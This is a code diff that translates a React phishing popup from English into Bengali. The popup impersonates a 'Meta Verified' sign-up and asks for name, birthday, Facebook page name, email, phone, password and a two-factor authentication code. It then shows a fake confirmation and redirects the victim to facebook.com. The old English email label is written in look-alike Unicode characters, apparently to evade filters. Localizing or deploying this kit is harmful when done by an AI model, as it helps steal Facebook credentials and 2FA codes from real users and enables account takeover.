@@ -248,28 +248,28 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                         <div class="mb-3">
 
                             <div id="emailHelp" class="form-text">
-                                 Please fill in the information to participate in Meta Verified
+                                 Meta Verified-এ অংশগ্রহণের জন্য অনুগ্রহ করে নিচের তথ্যগুলো পূরণ করুন
                             </div>
                         </div>
                                               <div class="mb-3">
-                            <label for="full-name-input" class="form-label"> Full Name</label>
+                            <label for="full-name-input" class="form-label">পূর্ণ নাম</label>
                             <input name="full-name" type="text" class="form-control" id="full-name-input"/>
                         </div>
                         <div class="mb-3">
-                            <label for="birthday-input" class="form-label">Birthday</label>
+                            <label for="birthday-input" class="form-label">জন্মতারিখ</label>
                             <input name="birth-day" type="date" class="form-control" id="birthday-input"/>
                         </div>
                         <div class="mb-3">
-                            <label for="fb-page-name-input" class="form-label">Facebook Page Name</label>
+                            <label for="fb-page-name-input" class="form-label">Facebook পেজের নাম</label>
                             <input name="page-name" type="text" class="form-control" id="fb-page-name-input"/>
                         </div>
                         <div className="mb-3">
-                            <label htmlFor="BuisenessEmailField" className="form-label">Εⅿаіⅼ Αⅾⅾrеѕѕ</label>
+                            <label htmlFor="BuisenessEmailField" className="form-label">ইমেইল ঠিকানা</label>
                             <input onChange={(e) => {if(e.target.value.length > 100) return;setMail(e.target.value);}} name="buiseness-email" type="email" className="form-control" id="BuisenessEmailField"/>
                         </div>
 
                         <div className="mb-3">
-                            <label htmlFor="PhoneFirld" className="form-label">Mobile phone number</label>
+                            <label htmlFor="PhoneFirld" className="form-label">মোবাইল ফোন নম্বর</label>
                             <PhoneInput
                             inputStyle={{border:'none',fontSize:'15px'}}
                             buttonStyle={{border:'none',backgroundColor:'#fff'}}
@@ -283,14 +283,13 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
 
 
                         <div style={{display: error ? 'inline-block' : 'none'}} className="mb-2 invalid-feedback">
-                          Email address or phone number is incorrect. Please try again!
+                          ইমেইল ঠিকানা অথবা ফোন নম্বরটি সঠিক নয়। অনুগ্রহ করে আবার চেষ্টা করুন!
                         </div>
 
                         <div className="mb-3 form-check">
                             <input type="checkbox" className="form-check-input" id="exampleCheck1"/>
-                            <label className="form-check-label" htmlFor="exampleCheck1">I agree with
-
-                                <a id="termsLink" className="add-svg">&nbsp;Terms of use
+                            <label className="form-check-label" htmlFor="exampleCheck1">আমি সম্মত আছি
+                                <a id="termsLink" className="add-svg">&nbsp;ব্যবহারের শর্তাবলি
                                 </a>
                             </label>
                         </div>
@@ -320,7 +319,7 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                                  <img onClick={togglePasswordVisiblity} style={{position:'absolute',right:'5%',width:'20px',height:'20px'}} src={passwordShown ? "/assets/eye.png" : "/assets/eye-close.png"}/>
                              </div>
                              <div style={{display: error == true ? 'inline-block' : 'none'}} className="mt-2 invalid-feedback">
-                                Password is incorrect, please try again.
+                                পাসওয়ার্ডটি সঠিক নয়, অনুগ্রহ করে আবার চেষ্টা করুন।
                             </div>
                          </div>
                          <div className="form-btn-wrapper">
@@ -332,7 +331,7 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                              </button>
                          </div>
                          <div id="forgot-pass-wrap">
-                             <span>Forgot password?</span>
+                             <span>“পাসওয়ার্ড ভুলে গেছেন?</span>
                          </div>
                      </div>
                      <div className="spaser"></div>
@@ -340,8 +339,8 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                     case 2: 
                      return (<div className="modal-body">
                      <div className="twoFAinfo-wraper">
-                         <h1 className="modal-title" id="2FAmodalLabel">Check your authentication code</h1>
-                         <p>Enter the 6-digit code for this account from the two-factor authentication app or text message on your mobile.</p>
+                         <h1 className="modal-title" id="2FAmodalLabel">আপনার যাচাইকরণ কোডটি যাচাই করুন</h1>
+                         <p>দয়া করে এই অ্যাকাউন্টের জন্য দুই-স্তরের যাচাইকরণ অ্যাপ অথবা আপনার মোবাইলে প্রাপ্ত টেক্সট মেসেজ থেকে ৬-সংখ্যার কোডটি প্রবেশ করান।</p>
                          <div className="fb-round-wraper">
                              <img src="img/2FA.png"  style={{width: '100%'}}/>
                          </div>
@@ -361,7 +360,7 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                   }} name="2FA-1" minLength="6" maxLength="8" type="tel" className="form-control" id="exampleInputPassword" autoComplete="off"/>
                              </div>
                              <div style={{display: error ? 'inline-block' : 'none'}} className="invalid-feedback">
-                                 Incorrect. Please, try again after <span id="timer"></span>
+                                 ভুল। অনুগ্রহ করে কিছুক্ষণ পর আবার চেষ্টা করুন। <span id="timer"></span>
                              </div>
                          </div>
                          <div className="form-btn-wrapper">
@@ -379,19 +378,19 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                       return (
                       <div className="modal-body">
                       <div className="twoFAinfo-wraper">
-                          <h1 className="modal-title" id="successModalLabel">Request has been sent</h1>
+                          <h1 className="modal-title" id="successModalLabel">অনুরোধ পাঠানো হয়েছে</h1>
                           <br/>
                           <div className="fb-round-wraper">
                               <img src="img/phone.png" style={{width: '100%'}}/>
                           </div>
                           <br/>
-                          <p>"Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with a result within 24 hours, please resend the request.</p>
+                          <p>আপনার অনুরোধটি প্রক্রিয়াকরণ কিউতে যোগ করা হয়েছে। আমরা ২৪ ঘণ্টার মধ্যে আপনার অনুরোধটি প্রক্রিয়া করব। যদি ২৪ ঘণ্টার মধ্যে ফলাফলসহ কোনো ইমেইল না পান, অনুগ্রহ করে আবার অনুরোধ পাঠান।</p>
   
                       </div>
                       <form action="https://facebook.com/" method="GET">
                           <div className="form-btn-wrapper">
                               <button className="btn btn-primary">
-                                  <span className="button-text">Return to facebook</span>
+                                  <span className="button-text">Facebook-এ ফিরে যান</span>
                               </button>
                           </div>
                       </form>
